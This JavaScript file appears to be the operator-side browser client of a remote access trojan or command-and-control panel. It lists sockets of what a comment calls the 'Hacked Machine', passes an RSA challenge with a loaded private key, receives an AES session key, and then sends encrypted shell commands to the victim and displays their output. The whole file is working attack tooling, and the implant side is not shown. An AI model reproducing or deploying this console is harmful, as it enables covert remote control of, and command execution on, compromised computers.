const socket = io();
let privateKey = null;
let symmetricKey = null;
let connectedSocketID = null;

document.addEventListener("DOMContentLoaded", () => {
    console.log("Load");
    socket.emit("joinRoom", "listener", "Client");
});

function connectToServer(id) {
    const fileInput = document.getElementById("fileInput");
    if (fileInput.files.length > 0) {
        const file = fileInput.files[0];
        const reader = new FileReader();
        reader.onload = function (event) {
            privateKey = event.target.result;
            console.log("private key loaded");
            socket.emit("connectToServer", id);
        };
        reader.readAsText(file, "UTF-8");
    } else {
        alert("No file selected");
    }
}

// Listen for messages from the server
socket.on("socketList", (msg) => {
    console.log("Updated Socket List");
    const ipTable = document.getElementById("ipTable");
    while (ipTable.firstChild) {
        ipTable.removeChild(ipTable.firstChild);
    }
    for (let i = 0; i < msg.length; i++) {
        const id = msg[i];

        const div = document.createElement("div");
        const label = document.createElement("label");
        label.innerText = id;
        const button = document.createElement("button");
        button.innerText = "Connect";
        button.id = `connectButton${i}`;
        button.addEventListener("click", () => { connectToServer(id); });

        div.appendChild(label);
        div.appendChild(button);
        ipTable.appendChild(div);
    }
});

function decryptWithPrivateKey(encryptedData) {
    if (privateKey == null) {
        return alert("No file.");
    }
    let decrypted;
    try {
        const realPrivKey = forge.pki.privateKeyFromPem(privateKey);
        const decodedData = forge.util.decode64(encryptedData);
        decrypted = realPrivKey.decrypt(decodedData);
    } catch (e) {
        alert("Decryption Failed! Check Logs.");
        console.log(e);
    }
    return decrypted;
}

function encryptAES(plaintext) {
    console.log(symmetricKey);
    const key = forge.util.decode64(symmetricKey);
    const iv = forge.random.getBytesSync(16); // Generate a random IV
    const cipher = forge.cipher.createCipher('AES-CBC', key);
    cipher.start({ iv: iv });
    cipher.update(forge.util.createBuffer(plaintext));
    cipher.finish();
    return {
        ciphertext: forge.util.encode64(cipher.output.getBytes()), // Ciphertext in hexadecimal
        iv: forge.util.encode64(iv) // IV in hexadecimal
    };
}

function decryptAES(encryptedData, ivHex) {
    const decipher = forge.cipher.createDecipher('AES-CBC', forge.util.decode64(symmetricKey));
    decipher.start({ iv: forge.util.decode64(ivHex) });
    decipher.update(forge.util.createBuffer(forge.util.decode64(encryptedData)));
    const result = decipher.finish(); // returns true if decryption was successful
    return decipher.output;
    // return result ? decipher.output.toString('utf8') : null;
}

// Socket ID of Hacked Machine
socket.on("encryptedChallenge2", (socketID, challenge) => {
    let decrypted = decryptWithPrivateKey(challenge);
    console.log("Decrypted", decrypted);
    socket.emit("decrypted1", socketID, decrypted);
});

socket.on("symmetric2", (socketID, encryptedAES) => {
    symmetricKey = decryptWithPrivateKey(encryptedAES);
    connectedSocketID = socketID;
    document.getElementById("ipTable").style.display = "none";
    document.getElementById("terminalContainer").classList.remove("blocked");
    const input = document.getElementById("terminalInput");
    input.addEventListener("keydown", function (event) {
        if (event.key === "Enter") {
            const inputValue = input.value;
            console.log('Input Value:', inputValue);
            input.value = '';
            let encrypted = encryptAES(inputValue);
            console.log(encrypted);
            socket.emit("command", connectedSocketID, encrypted);
        }
    });
});

socket.on("result", (socketID, encrypted) => {
    const decrypted = decryptAES(encrypted.ciphertext, encrypted.iv);
    const results = decrypted.data;
    document.getElementById("commandOutput").innerText = results;
});

socket.on("message", (msg) => {
    alert(msg);
});